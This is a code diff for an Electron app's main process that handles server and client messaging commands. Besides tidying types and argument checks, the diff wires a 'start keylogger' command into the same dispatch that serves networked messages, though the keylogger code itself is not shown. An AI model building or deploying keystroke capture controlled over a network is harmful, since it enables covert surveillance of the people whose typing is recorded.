@@ -80,7 +80,9 @@ const client = new Client(sendMessageToMainWindow);
 
 const keylogger = new KeyLogger(sendMessageToMainWindow);
 
-let currentInstance: string = "Standby";
+type CurrentInstances = "Standby" | "Server" | "Client";
+
+let currentInstance: CurrentInstances = "Standby";
 
 function sendMessageToMainWindow(message: any) {
 	if (!domHasLoaded)
@@ -97,7 +99,7 @@ ipcMain.handle("mainWindow", async (e, ...args) => {
 
 const ipcMethods = {
 	server: {
-		start: async function(port: number, host: string, password?: string) {
+		start: async function(port?: number, host?: string, password?: string) {
 			return await server.start(port, host, password);
 		},
 		stop: function() {
@@ -108,13 +110,13 @@ const ipcMethods = {
 		}
 	},
 	client: {
-		connect: async function(port: number, host: string, password: string, extraData: any) {
+		connect: async function(port: number, host?: string, password?: string | undefined, extraData?: any) {
 			return await client.connect(port, host, password, extraData);
 		},
 		disconnect: function() {
 			return client.disconnect();
 		},
-		sendMessage(message: string) {
+		sendMessage(message: any) {
 			return client.sendMessage(message);
 		}
 	},
@@ -140,14 +142,23 @@ const ipcMethods = {
 
 				currentInstance = "Server";
 				return ipcMethods.server.start(extraArgs[0], extraArgs[1], extraArgs[2]);
-			case "send message":
-				if (currentInstance == "Server") {
-					return ipcMethods.server.sendMessage(extraArgs[0]);
-				} else {
-					return ipcMethods.client.sendMessage(extraArgs[0]);
-				}
-			case "start keylogger":
+			case "stop server":
+				if (currentInstance != "Server") 
+					return "You must be a server / must first start a server to stop a server!";
 
+				currentInstance = "Standby";
+
+				return ipcMethods.server.stop();
+			case "send message":
+				if (extraArgs[0] === undefined)
+					return "You have to provide the message to send!";
+
+				if (currentInstance == "Server") 
+					return ipcMethods.server.sendMessage(extraArgs[0]);
+				else 
+					return ipcMethods.client.sendMessage(extraArgs[0]);
+			case "start keylogger":
+				return ipcMethods.keyLogger.start();
 			default:
 				return "Unknown Method. Better luck next time ¯\\_(ツ)_/¯";
 		}
